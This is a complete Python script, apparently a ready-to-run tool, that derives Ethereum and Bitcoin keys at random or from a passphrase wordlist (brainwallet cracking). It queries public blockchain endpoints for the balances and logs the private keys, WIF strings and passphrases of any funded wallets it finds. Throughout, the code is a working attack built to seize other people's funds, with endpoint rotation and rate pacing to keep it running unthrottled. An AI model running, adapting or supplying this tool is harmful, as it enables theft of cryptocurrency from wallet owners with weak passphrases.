#!/usr/bin/env python3
# language: Python 3.10+, file: wallet_hunter.py, target: Ethereum / Bitcoin key search + funded-wallet logger
# deps: py -m pip install coincurve pycryptodome requests
# usage:
#   py wallet_hunter.py --chain eth --mode random --workers 10 --rate 25 --min-balance 0.01
#   py wallet_hunter.py --chain eth --mode brainwallet --wordlist words.txt --workers 8
#   py wallet_hunter.py --chain btc --mode random --workers 2

import argparse
import csv
import hashlib
import itertools
import os
import secrets
import threading
import time

import requests
from coincurve import PrivateKey
from Crypto.Hash import RIPEMD160, SHA256, keccak

# ---------------------------------------------------------------- config --
RPC_ENDPOINTS = [
    "https://ethereum.publicnode.com",
    "https://eth.llamarpc.com",
    "https://eth.drpc.org",
    "https://eth.meowrpc.com",
    "https://1rpc.io/eth",
    "https://rpc.flashbots.net",
    "https://rpc.mevblocker.io",
    "https://cloudflare-eth.com",
    "https://rpc.ankr.com/eth",
]
BLOCKSCOUT = "https://eth.blockscout.com/api/v2/addresses/{addr}"   # keyless fallback
TIMEOUT = 8                # per-request timeout, seconds
COOLDOWN = 300             # benched endpoint rest time, seconds
KEY_FILE = "funded_keys.txt"
CSV_FILE = "funded_wallets.csv"

SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

lock = threading.Lock()
csv_lock = threading.Lock()
word_lock = threading.Lock()

counters = {"checked": 0, "hits": 0, "errors": 0, "t0": time.time()}
running = True


# ---------------------------------------------------------- rate limiter --
class Pacer:
    """Global key-rate gate: every key drawn waits for its slot on the clock."""

    def __init__(self, rate: float):
        self.interval = 1.0 / rate if rate > 0 else 0.0   # 0 = unlimited
        self.next_slot = time.time()
        self.lock = threading.Lock()

    def wait(self):
        if self.interval <= 0:
            return
        with self.lock:
            now = time.time()
            if now < self.next_slot:
                delay = self.next_slot - now
                self.next_slot += self.interval
            else:
                delay = 0.0
                self.next_slot = now + self.interval
        if delay > 0:
            time.sleep(delay)


PACER = Pacer(25.0)        # default 25 keys/sec — override with --rate


# --------------------------------------------- endpoint circuit breaker ---
class EndpointPool:
    """Rotates endpoints; benches any that fail 3 times in a row for COOLDOWN."""

    def __init__(self, urls):
        self.order = list(urls)
        self.state = {u: {"fails": 0, "until": 0.0} for u in self.order}
        self.idx = 0
        self.lock = threading.Lock()

    def next(self) -> str:
        with self.lock:
            now = time.time()
            for _ in range(len(self.order)):
                u = self.order[self.idx % len(self.order)]
                self.idx += 1
                if now >= self.state[u]["until"]:
                    return u
            return min(self.order, key=lambda x: self.state[x]["until"])

    def report(self, url: str, ok: bool):
        with self.lock:
            st = self.state[url]
            if ok:
                st["fails"] = 0
            else:
                st["fails"] += 1
                if st["fails"] >= 3:
                    st["until"] = time.time() + COOLDOWN
                    st["fails"] = 0
                    print(f"[net] endpoint benched {COOLDOWN}s: {url}")


POOL = EndpointPool(RPC_ENDPOINTS)


# ------------------------------------------------- address derivation ----
def fresh_priv() -> bytes:
    while True:
        priv = secrets.token_bytes(32)
        n = int.from_bytes(priv, "big")
        if 0 < n < SECP256K1_ORDER:          # curve-order rejection, coincurve raises otherwise
            return priv


def priv_to_eth_addr(priv: bytes) -> str:
    pub = PrivateKey(priv).public_key.format(compressed=False)[1:]   # strip 0x04
    k = keccak.new(digest_bits=256)
    k.update(pub)
    return "0x" + k.hexdigest()[-40:]


def hash160(b: bytes) -> bytes:
    return RIPEMD160.new(SHA256.new(b).digest()).digest()


# ---- bech32 (BIP-173), hand-rolled, no extra deps ----
B32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

def bech32_polymod(values):
    gen = [0x3B6A57B2, 0x26508E6D, 0x1EA119FA, 0x3D4233DD, 0x2A1462B3]
    chk = 1
    for v in values:
        b = chk >> 25
        chk = (chk & 0x1FFFFFF) << 5 ^ v
        for i in range(5):
            chk ^= gen[i] if ((b >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data):
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def convertbits(data, frombits, tobits, pad=True):
    acc = bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    for value in data:
        acc = (acc << frombits) | value
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad and bits:
        ret.append((acc << (tobits - bits)) & maxv)
    return ret

def bech32_encode(hrp, data5):
    combined = data5 + bech32_create_checksum(hrp, data5)
    return hrp + "1" + "".join(B32_CHARSET[d] for d in combined)


def priv_to_btc_addr(priv: bytes) -> str:
    pub = PrivateKey(priv).public_key.format(compressed=True)
    program = convertbits(hash160(pub), 8, 5)
    return bech32_encode("bc", [0] + program)          # witness v0, p2wpkh


B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def b58check(payload: bytes) -> str:
    data = payload + hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    pad = 0
    for b in data:
        if b == 0:
            pad += 1
        else:
            break
    return "1" * pad + out

def priv_to_wif(priv: bytes) -> str:
    return b58check(b"\x80" + priv + b"\x01")           # compressed-key WIF


# ------------------------------------------------------ balance checks ---
def blockscout_wei(addr: str):
    """Keyless second source. Returns wei int, or None if it cannot answer."""
    try:
        r = requests.get(BLOCKSCOUT.format(addr=addr), timeout=TIMEOUT)
        if r.status_code == 200:
            v = r.json().get("coin_balance")
            return int(v) if v else 0
    except Exception:
        pass
    return None


def eth_balance_batch(addrs, min_wei: int):
    """Batched eth_getBalance with per-address fallback to Blockscout.
    Returns list of (addr, wei) strictly over threshold."""
    payload = [{"jsonrpc": "2.0", "id": i, "method": "eth_getBalance",
                "params": [a, "latest"]} for i, a in enumerate(addrs)]
    for attempt in range(3):
        url = POOL.next()
        try:
            r = requests.post(url, json=payload, timeout=TIMEOUT)
            POOL.report(url, r.status_code < 500)
            if r.status_code == 429 or r.status_code >= 500:
                time.sleep(0.5 * (attempt + 1)); continue
            r.raise_for_status()
            body = r.json()
            if isinstance(body, list):
                out = []
                for item in body:
                    if "error" in item or "result" not in item:
                        with lock:
                            counters["errors"] += 1
                        continue
                    wei = int(item["result"], 16)
                    if wei > min_wei:                      # strict — zero balance is never a hit
                        out.append((addrs[item["id"]], wei))
                return out
        except Exception:
            POOL.report(url, False)
            time.sleep(0.5 * (attempt + 1))
    # batch path dead — per-address: RPC single, then Blockscout
    out = []
    for a in addrs:
        wei = None
        url = POOL.next()
        try:
            r = requests.post(url, json={"jsonrpc": "2.0", "id": 1,
                                         "method": "eth_getBalance",
                                         "params": [a, "latest"]}, timeout=TIMEOUT)
            POOL.report(url, r.status_code < 500)
            wei = int(r.json()["result"], 16)
        except Exception:
            POOL.report(url, False)
            wei = blockscout_wei(a)            # second source answers when RPC sulks
        if wei is None:
            with lock:
                counters["errors"] += 1
        elif wei > min_wei:
            out.append((a, wei))
    return out


def btc_balance(addr: str, min_sat: int):
    """Blockstream REST, one call per address, satoshi balance over threshold."""
    for attempt in range(3):
        try:
            r = requests.get(f"https://blockstream.info/api/address/{addr}", timeout=TIMEOUT)
            if r.status_code == 429:
                time.sleep(1.0 * (attempt + 1)); continue
            r.raise_for_status()
            j = r.json()
            sat = (j["chain_stats"]["funded_txo_sum"]
                   - j["chain_stats"]["spent_txo_sum"])
            return sat if sat > min_sat else 0
        except Exception:
            time.sleep(1.0 * (attempt + 1))
    return -1


# ------------------------------------------------------------- logging ---
def log_hit(chain, tag, priv_hex, addr, amount, extra=""):
    with lock:
        counters["hits"] += 1
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
        with open(KEY_FILE, "a", encoding="utf-8") as f:
            f.write(f"{chain} | {priv_hex} | {addr} | {amount} | {tag} | {extra} | {ts}\n")
        new = not os.path.exists(CSV_FILE)
        with csv_lock, open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            if new:
                w.writerow(["chain", "private_key_hex", "address", "balance", "tag", "extra", "found_utc"])
            w.writerow([chain, priv_hex, addr, amount, tag, extra, ts])
        print(f"[HIT] {chain} {addr}  {amount}  key={priv_hex}  tag={tag}")


# -------------------------------------------------------------- workers --
def eth_worker(batch_size, min_wei):
    while running:
        pairs = []
        for _ in range(batch_size):
            PACER.wait()                       # global rate gate — every key takes a slot
            priv = fresh_priv()
            pairs.append((priv.hex(), priv_to_eth_addr(priv)))
        found = eth_balance_batch([a for _, a in pairs], min_wei)
        with lock:
            counters["checked"] += batch_size
        for addr, wei in found:
            for ph, a in pairs:
                if a == addr:
                    log_hit("eth", "random", ph, addr, f"{wei / 1e18:.8f} ETH")


def btc_worker(min_sat):
    while running:
        PACER.wait()                           # same gate on the BTC side
        priv = fresh_priv()
        addr = priv_to_btc_addr(priv)
        sat = btc_balance(addr, min_sat)
        if sat < 0:
            with lock:
                counters["errors"] += 1
            continue
        with lock:
            counters["checked"] += 1
        if sat > 0:
            log_hit("btc", "random", priv.hex(), addr, f"{sat / 1e8:.8f} BTC", extra=priv_to_wif(priv))


def brainwallet_source(wordlist_path):
    """Yields (priv, passphrase). Whole file loaded once, deduped."""
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        seen = set()
        for line in f:
            pw = line.rstrip("\r\n")
            if not pw or pw in seen:
                continue
            seen.add(pw)
            yield hashlib.sha256(pw.encode("utf-8")).digest(), pw


def eth_brain_worker(batch_size, min_wei, gen):
    while running:
        pairs = []
        for _ in range(batch_size):
            with word_lock:
                item = next(gen, None)
            if item is None:
                break                      # wordlist exhausted — flush what we hold
            priv, pw = item
            PACER.wait()                   # paced checks in brainwallet mode too
            pairs.append((priv.hex(), priv_to_eth_addr(priv), pw))
        if not pairs:                      # nothing left anywhere — done
            return
        found = eth_balance_batch([p[1] for p in pairs], min_wei)
        with lock:
            counters["checked"] += len(pairs)
        for addr, wei in found:
            for ph, a, pw in pairs:
                if a == addr:
                    log_hit("eth", "brainwallet", ph, addr, f"{wei / 1e18:.8f} ETH", extra=pw)


def btc_brain_worker(min_sat, gen):
    while running:
        with word_lock:
            item = next(gen, None)
        if item is None:
            return
        priv, pw = item
        PACER.wait()
        addr = priv_to_btc_addr(priv)
        sat = btc_balance(addr, min_sat)
        if sat < 0:
            with lock:
                counters["errors"] += 1
            continue
        with lock:
            counters["checked"] += 1
        if sat > 0:
            log_hit("btc", "brainwallet", priv.hex(), addr, f"{sat / 1e8:.8f} BTC",
                    extra=f"{priv_to_wif(priv)} | pw={pw}")


def stats_thread():
    while running:
        time.sleep(5)
        with lock:
            el = time.time() - counters["t0"]
            rate = counters["checked"] / el if el else 0
            print(f"[stat] checked={counters['checked']}  keys/s={rate:.1f}  "
                  f"hits={counters['hits']}  errors={counters['errors']}  "
                  f"elapsed={el:.0f}s")


def main():
    global running, PACER
    ap = argparse.ArgumentParser()
    ap.add_argument("--chain", choices=["eth", "btc"], default="eth")
    ap.add_argument("--mode", choices=["random", "brainwallet"], default="random")
    ap.add_argument("--wordlist", help="passphrase file, one per line (brainwallet mode)")
    ap.add_argument("--workers", type=int, default=10)
    ap.add_argument("--batch", type=int, default=10, help="addresses per RPC batch (eth only)")
    ap.add_argument("--min-balance", type=float, default=0.01,
                    help="log only balances strictly above this, chain units")
    ap.add_argument("--rate", type=float, default=25.0,
                    help="keys per second, global (default 25, 0 = unlimited)")
    args = ap.parse_args()

    min_wei = int(args.min_balance * 1e18)
    min_sat = int(args.min_balance * 1e8)
    PACER = Pacer(args.rate)

    threads = []
    st = threading.Thread(target=stats_thread, daemon=True)
    st.start()

    try:
        if args.chain == "eth":
            if args.mode == "brainwallet":
                gen = brainwallet_source(args.wordlist)
                target = lambda: eth_brain_worker(args.batch, min_wei, gen)
            else:
                target = lambda: eth_worker(args.batch, min_wei)
        else:
            if args.mode == "brainwallet":
                gen = brainwallet_source(args.wordlist)
                target = lambda: btc_brain_worker(min_sat, gen)
            else:
                target = lambda: btc_worker(min_sat)

        for _ in range(args.workers):
            t = threading.Thread(target=target, daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            while t.is_alive():
                t.join(1.0)
    except KeyboardInterrupt:
        running = False
        print("\n[stop] shutting down…")

    with lock:
        el = time.time() - counters["t0"]
        print(f"\n[done] checked={counters['checked']} hits={counters['hits']} "
              f"errors={counters['errors']} in {el:.0f}s")
        print(f"[done] keys -> {KEY_FILE}   table -> {CSV_FILE}")


if __name__ == "__main__":
    main()